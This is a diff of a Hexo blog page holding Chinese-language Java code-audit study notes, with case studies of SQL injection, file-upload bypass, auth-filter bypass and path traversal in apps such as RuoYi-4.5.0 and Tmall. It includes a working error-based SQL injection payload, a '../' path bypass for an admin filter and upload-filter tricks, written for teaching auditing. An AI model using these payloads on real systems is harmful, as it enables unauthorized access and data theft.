@@ -21,57 +21,57 @@
   
     <meta name="description" content="Java代码审计 读懂一段代码：从下到上追踪，找到变量的传递与函数之间的关系，理清代码即可大致读懂 分析变量组成：打印出每个过程参数的值逐个分析(调试)  通用步骤 寻找漏洞触发点 构造payload尝试利用漏洞  checklistJava代码审计checklist（上） (qq.com) JAVA攻防基础之代码审计 (qq.com) SQL注入 三个模式 JDBC，Mybatis，Hibern">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hexo">
+<meta property="og:title" content="Java代码审计">
 <meta property="og:url" content="http://example.com/2025/05/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Java代码审计 读懂一段代码：从下到上追踪，找到变量的传递与函数之间的关系，理清代码即可大致读懂 分析变量组成：打印出每个过程参数的值逐个分析(调试)  通用步骤 寻找漏洞触发点 构造payload尝试利用漏洞  checklistJava代码审计checklist（上） (qq.com) JAVA攻防基础之代码审计 (qq.com) SQL注入 三个模式 JDBC，Mybatis，Hibern">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A101.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A102.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A103.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A104.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A105.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A112.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A113.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A116.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A117.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A118.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A119.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A120.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A121.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A122.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\Java%E5%AE%A1%E8%AE%A123.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A124.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A125.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A126.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A127.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A128.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A129.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A130.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A131.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A132.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A133.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A134.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A101.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A102.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A103.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A104.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A105.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A112.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A113.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A116.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A117.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A118.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A119.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A120.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A121.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A122.png">
+<meta property="og:image" content="http://example.com/image%5CJava%E5%AE%A1%E8%AE%A123.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A124.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A125.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A126.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A127.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A128.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A129.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A130.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A131.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A132.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A133.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A134.png">
 <meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm7ZibH49F3GjQpYAic5fibnLPIPibNDVZ3Zq8iaeA6uxPbqOxqcd536j9ztw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A135.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A136.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A137.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A138.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A139.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A140.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A141.png">
-<meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A142.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A135.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A136.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A137.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A138.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A139.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A140.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A141.png">
+<meta property="og:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A142.png">
 <meta property="og:image" content="https://image.3001.net/images/20221209/1670591008_63933220d0b7298b0fb3f.png!small">
 <meta property="og:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\%E6%B3%A8%E5%85%A5%E7%82%B9.png">
 <meta property="article:published_time" content="2025-05-27T11:25:17.199Z">
-<meta property="article:modified_time" content="2025-06-16T12:31:56.540Z">
+<meta property="article:modified_time" content="2025-06-17T10:53:52.958Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="e:\a%E7%BD%91%E5%AE%89\%E7%AC%94%E8%AE%B0\java\java%E5%AE%A1%E8%AE%A101.png">
+<meta name="twitter:image" content="http://example.com/image%5Cjava%E5%AE%A1%E8%AE%A101.png">
   
   
   
-  <title>Hexo</title>
+  <title>Java代码审计 - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -237,7 +237,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="Java代码审计"></span>
           
         </div>
 
@@ -260,7 +260,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          8.4k words
+          8.3k words
         
       </span>
     
@@ -308,7 +308,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">Java代码审计</h1>
             
             
               <div class="markdown-body">
@@ -363,13 +363,13 @@
 <li><p>查看配置文件发现是JDBC驱动</p>
 </li>
 <li><p>全局搜索append()关键字，寻找与sql相关的语句</p>
-<p><img src="E:\a网安\笔记\java\java审计01.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A101.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现新定义了一个sql语句，并且使用了append()函数拼接</p>
 </li>
 <li><p>判断orderBy变量是否可控，有无过滤</p>
 <ul>
 <li><p>追踪getBaseForm()类与getOrderBy()方法发现</p>
-<p><img src="E:\a网安\笔记\java\java审计02.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A102.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ul>
 </li>
@@ -380,11 +380,11 @@
 <li><p>查看文字说明发现此oa系统使用的是Mybatis框架</p>
 </li>
 <li><p>指定文件掩码为 *.xml，全局搜索${</p>
-<p><img src="E:\a网安\笔记\java\java审计03.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A103.png" srcset="/img/loading.gif" lazyload></p>
 <p>跳转查看baseKey参数，全局搜索selece的id值sortMyNotice</p>
 </li>
 <li><p>寻找baseKey的实现，确定路由为(&#x2F;informlistpaging)</p>
-<p><img src="E:\a网安\笔记\java\java审计04.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A104.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>找到路由后访问抓取数据包，使用sqlmap测试payload</p>
 </li>
@@ -395,7 +395,7 @@
 <li><p>搜索关键字${</p>
 </li>
 <li><p>找到可能存在不安全写法的地方(筛选出可能的注入点，可执行sql语句)</p>
-<p><img src="E:\a网安\笔记\java\java审计05.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A105.png" srcset="/img/loading.gif" lazyload></p>
 <p>追踪updateDeptStatus的用法</p>
 </li>
 <li><p>全局搜索updateDeptStatus关键字逐个查找用法(寻找路由关系)</p>
@@ -426,12 +426,12 @@
 <li><p>使用sqlmap无法成功注入，使用手工注入</p>
 </li>
 <li><pre><code class="language-java">DeptName=1&amp;DeptId=100&amp;ParentId=12&amp;&amp;status=0&amp;OrderNum=1&amp;ancestors=0)or(extractvalue(1,concat((select user()))));#
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">  -</span> 使用括号绕过空格过滤<br><br><span class="hljs-section">### 文件安全</span><br><br>[<span class="hljs-string">Java代码审计：文件篇/文件上传/文件读取/目录遍历_潜在路径遍历(文件读取) 打开文件以读取其内容。文件名来自输入参数。如果将未过-CSDN博客</span>](<span class="hljs-link">https://blog.csdn.net/god_zzZ/article/details/108104523</span>)<br><br><span class="hljs-bullet">-</span> 关键字查询<br><br>  ![](<span class="hljs-link">E:\a网安\笔记\java\java审计06.png</span>)<br><br>  ![](<span class="hljs-link">E:\a网安\笔记\java\java审计07.png</span>)<br><br><span class="hljs-section">#### Inxedu案例(前台文件上传)</span><br><br><span class="hljs-bullet">-</span> 搭建网站后直接寻找功能点，发现有文件上传<br><br><span class="hljs-bullet">-</span> 尝试上传文件找到路由<br><br><span class="hljs-bullet">-</span> 此网站源码将文件安全代码封装在jar包中，ImageUploadController.class，需要通读目录，理清结构才能找到<br><br><span class="hljs-bullet">-</span> 根据上传文件时找到的路由，确定控制代码<br><br><span class="hljs-bullet">-</span> 发现是黑名单过滤，只过滤jsp文件<br><br>  ![](<span class="hljs-link">E:\a网安\笔记\java\java审计08.png</span>)<br><br><span class="hljs-bullet">-</span> 使用工具生成jspx文件，修改前端白名单过滤代码，成功上传<br><br><span class="hljs-section">#### Tmall案例</span><br><br><span class="hljs-section">##### 后台文件上传</span><br><br><span class="hljs-bullet">-</span> 搜索文件安全相关关键字<br><br><span class="hljs-bullet">-</span> 搜索new File，找到文件上传相关代码<br><br>  ![](<span class="hljs-link">E:\a网安\笔记\java\java审计09.png</span>)<br><br>  文件上传过滤一般关注后缀，所以在此段代码中应该关注文件名后缀是如何获取的<br><br>  发现这段代码是直接获取了原文件后缀后并没有过滤，而是直接上传了<br><br><span class="hljs-bullet">-</span> 开始测试，发现有前端验证，抓包后更改后缀为jsp可以正常上传<br><br><span class="hljs-section">##### 过滤器鉴权</span><br><br><span class="hljs-bullet">-</span> 找到过滤器核心代码AdminPermissionFilter类<br><br><span class="hljs-bullet">-</span> 找到核心控制方法doFilter<br><br>  ![](<span class="hljs-link">E:\a网安\笔记\java\java审计10.png</span>)<br><br>  发现鉴权存在了漏洞，容易越权<br><br><span class="hljs-bullet">-</span> 进行测试<br><br><span class="hljs-bullet">  -</span> 在数据包url中加上 /admin/login/../../<br><span class="hljs-bullet">  -</span> 成功绕过鉴权<br><br><span class="hljs-section">#### RuoYi-4.5.0(文件下载)</span><br><br><span class="hljs-bullet">-</span> 搜索关键字new FileInputStream<br><br>  ![](<span class="hljs-link">E:\a网安\笔记\java\java审计11.png</span>)<br><br>  找到这段相关代码控制字节输出，但是发现这个类中没有路由关系，不能直接触发此漏洞<br><br><span class="hljs-bullet">-</span> 尝试查找是否有用过writeBytes方法<br><br><span class="hljs-bullet">-</span> 查找用法后发现，CommonController类中fileDownload方法和resourceDownload方法调用了此方法<br><br>  <span class="hljs-code">```java</span><br><span class="hljs-code">  @GetMapping(&quot;/common/download/resource&quot;)</span><br><span class="hljs-code">      public void resourceDownload(String resource, HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-code">              throws Exception</span><br><span class="hljs-code">      &#123;</span><br><span class="hljs-code">          // 本地资源路径</span><br><span class="hljs-code">          String localPath = Global.getProfile();</span><br><span class="hljs-code">          // 数据库资源地址</span><br><span class="hljs-code">          String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);</span><br><span class="hljs-code">          // 下载名称</span><br><span class="hljs-code">          String downloadName = StringUtils.substringAfterLast(downloadPath, &quot;/&quot;);</span><br><span class="hljs-code">  </span><br><span class="hljs-code">          response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);</span><br><span class="hljs-code">          FileUtils.setAttachmentResponseHeader(response, downloadName);</span><br><span class="hljs-code">  </span><br><span class="hljs-code">          FileUtils.writeBytes(downloadPath, response.getOutputStream());</span><br><span class="hljs-code">      &#125;</span><br><span class="hljs-code">  &#125;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">  -</span> 使用括号绕过空格过滤<br><br><span class="hljs-section">### 文件安全</span><br><br>[<span class="hljs-string">Java代码审计：文件篇/文件上传/文件读取/目录遍历_潜在路径遍历(文件读取) 打开文件以读取其内容。文件名来自输入参数。如果将未过-CSDN博客</span>](<span class="hljs-link">https://blog.csdn.net/god_zzZ/article/details/108104523</span>)<br><br><span class="hljs-bullet">-</span> 关键字查询<br><br>  ![](<span class="hljs-link">image\java审计06.png</span>)<br><br>  ![](<span class="hljs-link">image\java审计07.png</span>)<br><br><span class="hljs-section">#### Inxedu案例(前台文件上传)</span><br><br><span class="hljs-bullet">-</span> 搭建网站后直接寻找功能点，发现有文件上传<br><br><span class="hljs-bullet">-</span> 尝试上传文件找到路由<br><br><span class="hljs-bullet">-</span> 此网站源码将文件安全代码封装在jar包中，ImageUploadController.class，需要通读目录，理清结构才能找到<br><br><span class="hljs-bullet">-</span> 根据上传文件时找到的路由，确定控制代码<br><br><span class="hljs-bullet">-</span> 发现是黑名单过滤，只过滤jsp文件<br><br>  ![](<span class="hljs-link">image\java审计08.png</span>)<br><br><span class="hljs-bullet">-</span> 使用工具生成jspx文件，修改前端白名单过滤代码，成功上传<br><br><span class="hljs-section">#### Tmall案例</span><br><br><span class="hljs-section">##### 后台文件上传</span><br><br><span class="hljs-bullet">-</span> 搜索文件安全相关关键字<br><br><span class="hljs-bullet">-</span> 搜索new File，找到文件上传相关代码<br><br>  ![](<span class="hljs-link">image\java审计09.png</span>)<br><br>  文件上传过滤一般关注后缀，所以在此段代码中应该关注文件名后缀是如何获取的<br><br>  发现这段代码是直接获取了原文件后缀后并没有过滤，而是直接上传了<br><br><span class="hljs-bullet">-</span> 开始测试，发现有前端验证，抓包后更改后缀为jsp可以正常上传<br><br><span class="hljs-section">##### 过滤器鉴权</span><br><br><span class="hljs-bullet">-</span> 找到过滤器核心代码AdminPermissionFilter类<br><br><span class="hljs-bullet">-</span> 找到核心控制方法doFilter<br><br>  ![](<span class="hljs-link">image\java审计10.png</span>)<br><br>  发现鉴权存在了漏洞，容易越权<br><br><span class="hljs-bullet">-</span> 进行测试<br><br><span class="hljs-bullet">  -</span> 在数据包url中加上 /admin/login/../../<br><span class="hljs-bullet">  -</span> 成功绕过鉴权<br><br><span class="hljs-section">#### RuoYi-4.5.0(文件下载)</span><br><br><span class="hljs-bullet">-</span> 搜索关键字new FileInputStream<br><br>  ![](<span class="hljs-link">image\java审计11.png</span>)<br><br>  找到这段相关代码控制字节输出，但是发现这个类中没有路由关系，不能直接触发此漏洞<br><br><span class="hljs-bullet">-</span> 尝试查找是否有用过writeBytes方法<br><br><span class="hljs-bullet">-</span> 查找用法后发现，CommonController类中fileDownload方法和resourceDownload方法调用了此方法<br><br>  <span class="hljs-code">```java</span><br><span class="hljs-code">  @GetMapping(&quot;/common/download/resource&quot;)</span><br><span class="hljs-code">      public void resourceDownload(String resource, HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-code">              throws Exception</span><br><span class="hljs-code">      &#123;</span><br><span class="hljs-code">          // 本地资源路径</span><br><span class="hljs-code">          String localPath = Global.getProfile();</span><br><span class="hljs-code">          // 数据库资源地址</span><br><span class="hljs-code">          String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);</span><br><span class="hljs-code">          // 下载名称</span><br><span class="hljs-code">          String downloadName = StringUtils.substringAfterLast(downloadPath, &quot;/&quot;);</span><br><span class="hljs-code">  </span><br><span class="hljs-code">          response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);</span><br><span class="hljs-code">          FileUtils.setAttachmentResponseHeader(response, downloadName);</span><br><span class="hljs-code">  </span><br><span class="hljs-code">          FileUtils.writeBytes(downloadPath, response.getOutputStream());</span><br><span class="hljs-code">      &#125;</span><br><span class="hljs-code">  &#125;</span><br></code></pre></td></tr></table></figure>
 </code></pre>
 </li>
 </ul>
 <p>打印出localPath与downloadPath的值查看resource参数是如何构成的</p>
-<p><img src="E:\a网安\笔记\java\java审计12.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A112.png" srcset="/img/loading.gif" lazyload></p>
 <p>代码释义</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 资源文件下载接口</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> resource 资源路径参数（包含资源标识符）</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request HTTP请求对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response HTTP响应对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception 可能抛出的异常</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span>  <span class="hljs-comment">// 定义GET请求映射路径</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-comment">// 获取本地资源存储的基础路径（例如：D:/upload/）</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>    <br>    <span class="hljs-comment">// 从resource参数中截取资源相对路径，并拼接成完整物理路径</span><br>    <span class="hljs-comment">// 例如：resource=&quot;profile/xxx.jpg&quot; → 截取后变成&quot;/xxx.jpg&quot; → 最终路径&quot;D:/upload/xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>    <br>    <span class="hljs-comment">// 从完整路径中提取文件名（最后一个/后的内容）</span><br>    <span class="hljs-comment">// 例如：&quot;D:/upload/xxx.jpg&quot; → &quot;xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br><br>    <span class="hljs-comment">// 设置响应内容类型为二进制流（强制浏览器下载而不是直接打开）</span><br>    response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>    <br>    <span class="hljs-comment">// 设置响应头，指定下载文件名（解决中文乱码等问题）</span><br>    FileUtils.setAttachmentResponseHeader(response, downloadName);<br><br>    <span class="hljs-comment">// 将文件内容写入响应输出流（实现下载）</span><br>    FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -451,7 +451,7 @@
 <p>读懂一段代码：从下到上追踪，找到变量的传递与函数之间的关系，理清代码即可大致读懂</p>
 </li>
 <li><p>打印出每个过程参数的值逐个分析</p>
-<p><img src="E:\a网安\笔记\java\java审计13.png" srcset="/img/loading.gif" lazyload></p>
